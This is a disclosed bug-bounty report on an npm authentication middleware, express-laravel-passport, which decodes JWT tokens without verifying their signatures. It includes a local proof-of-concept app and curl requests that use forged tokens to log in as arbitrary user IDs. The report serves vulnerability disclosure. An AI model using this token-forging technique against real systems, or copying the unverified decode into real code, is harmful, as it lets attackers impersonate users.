# [express-laravel-passport] Improper Authentication

## Report Details
- **Report ID**: 748214
- **URL**: https://hackerone.com/reports/748214
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-11-29T00:48:44.901Z
- **Disclosed**: 2020-01-04T22:09:36.655Z

## Reporter
- **Username**: ermilov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report Improper Authentication in `express-laravel-passport`
It allows to forge user's identity

# Module

**module name:** express-laravel-passport
**version:** 1.1.2
**npm page:** `https://www.npmjs.com/package/express-laravel-passport`

## Module Description

You want a middleware support express get authorization from laravel-passport-structured database, this will help you.

## Module Stats

14 weekly downloads

# Vulnerability

## Vulnerability Description

`express-laravel-passport` is an authentication middleware which utilizes JWT tokens. The module defined to handle authentication but does not validate the JWT token sent by the user. Therefore it allows modifying payload within the token. This weakness provides an opportunity to forge the user's identity by changing the information inside the token's payload that is used to authenticate the client.

source code example:

https://github.com/EugeneNguyen/express-laravel-passport/blob/master/src/index.js#L13

```
const { jti } = jwt.decode(token);
```

`jti` variable retrieved from the token without any verification

## Steps To Reproduce:

* create directory for testing
```bash
mkdir poc
cd poc/
```

* install dependencies required for `express-laravel-passport` and test app to work

```bash
npm init
npm i express
npm i sequelize@4.32.7
npm i sqlite3
npm i express-laravel-passport
```

* create `index.js` with test application code

```javascript
const express = require('express')
const Sequelize = require('sequelize')
const passport = require('express-laravel-passport')

// create inmemory Sqlite DB for testing purposes
const sequelize = new Sequelize('database', 'username', 'password', {dialect: 'sqlite'})

// init express
const app = express()
const port = 3000

// create instance of `express-laravel-passport`
const passportMiddleware = passport(sequelize)

// create db Model that simulates structure required for `express-laravel-passport` to work properly
const Model = sequelize.define('oauth_access_tokens', {
  user_id: Sequelize.INTEGER
}, {
  timestamps: false
});

// create DB
sequelize.sync()
  // put some test data to DB
  .then(() => Model.bulkCreate([{user_id:1},{user_id:2},{user_id:3}]))
  // run the express app with `express-laravel-passport` as middleware
  .then(() => {
    app.get('/', passportMiddleware, (req, res) => {
      const user_id = req.user_id;
      if (user_id) {
        res.send(`logged in as: ${user_id}\n`)
      } else {
        res.send('not logged in\n')
      }
    })

    app.listen(port, () => console.log(`Example app listening on port ${port}!`))
  })
```

* run it

```bash
node index.js
```

the app runs on `localhost:3000`, so now you can send requests to this address in order to test its behaviour

* send crafted request with JWT token in `authorization` header
token is `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjF9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc`

which represents this payload: `{"jti": 1}` and was simply created at www.jwt.io

```bash
curl -H "authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjF9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc" localhost:3000
```

`logged in as: 1` is logged to the console as a result

* send another crafted request with JWT token in `authorization` header
token is `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjJ9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc`

which represents this payload: `{"jti": 2}` ***BUT*** keeps the signature from previous token (n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc), therefore this token is not valid by any means

```bash
curl -H "authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjJ9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc" localhost:3000
```

`logged in as: 2` is logged to the console as a result, which illustrates the fact that it is possible to forge JWT tokens and fake id of the user.


While testing you can put a breakpoint in poc/node_modules/express-laravel-passport/src/index.js file on line 13, to make sure that it is the `express-laravel-passport` responsible for handling token verification

## Patch

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Linux Mint current
- NODEJS VERSION: 12.7.0
- NPM VERSION: 6.10.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

This weakness provides opportunity to forge user's identity by changing information inside token's payload that is used to verify the client.

## Attachments
No attachments
